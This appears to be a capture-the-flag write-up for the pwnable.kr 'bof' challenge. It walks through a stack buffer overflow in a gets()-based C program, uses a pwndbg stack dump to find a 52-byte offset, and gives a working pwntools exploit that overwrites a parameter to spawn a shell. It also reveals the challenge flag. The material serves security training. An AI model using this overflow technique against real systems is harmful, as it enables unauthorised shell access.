# bof
The third challenge from pwnable.kr

## Description
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

## Solution

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Immediately you can notice that this is a buffer overflow due to the use of insecure gets(), which doesn't specify a buffer limit.

We need to overwrite the variable `key` so that it equals `0xcafebabe` in order to get `/bin/sh` access.

`key` is a parameter in this function and it's set to `0xdeadbeef`, so let's open up pwndbg to find that on the stack and figure out the length of our padding.

`pwndbg ./bof`

```
pwndbg> b gets
Breakpoint 1 at 0x4c0
pwndbg> r
Starting program: /home/ctf/challenges/bof/bof
overflow me :

Breakpoint 1, 0xf75c5e60 in gets () from /lib/i386-linux-gnu/libc.so.6
```

```
pwndbg> finish
Run till exit from #0  0xf75c5e60 in gets () from /lib/i386-linux-gnu/libc.so.6
aaaaaaaaaaaaaaaa
```

```
pwndbg> x/100x $esp
0xffaf6040:	0xffaf605c	0x00000000	0x000000c2	0xf75f7d56
0xffaf6050:	0xffffffff	0xffaf607e	0xf756dc34	0x61616161
0xffaf6060:	0x61616161	0x61616161	0x61616161	0x56585400
0xffaf6070:	0xffaf788f	0x0000002f	0x56586ff4	0x5799de00
0xffaf6080:	0x565856b0	0x56585530	0xffaf60a8	0x5658569f
0xffaf6090:	0xdeadbeef	0xf7743000	0x565856b9	0xf770e000
```

We can see by examining, in hex representation, that our target is 52 bytes away from the start of our input, a = 0x61

Let's pad 52 bytes then add 0xcafebabe.

```python
from pwn import *

conn = remote('pwnable.kr', 9000)

p = 'a'*52
p += p32(0xcafebabe)

conn.sendline(p)

conn.interactive()
```


### Capturing the Flag

```
(ctftools)ctf@b1b157128929:~/challenges/bof$ python exploit.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls
bof
bof.c
flag
log
log2
super.pl
$ cat flag
daddy, I just pwned a buFFer :)
```
